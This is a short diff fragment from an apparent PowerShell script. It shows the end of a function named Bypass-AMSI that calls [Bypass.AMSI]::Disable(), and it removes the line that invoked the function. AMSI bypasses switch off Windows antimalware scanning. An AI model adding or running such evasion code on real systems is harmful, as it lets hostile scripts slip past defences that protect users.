@@ -6,4 +6,3 @@ function Bypass-AMSI
     }
     [Bypass.AMSI]::Disable()
 }
-Bypass-AMSI
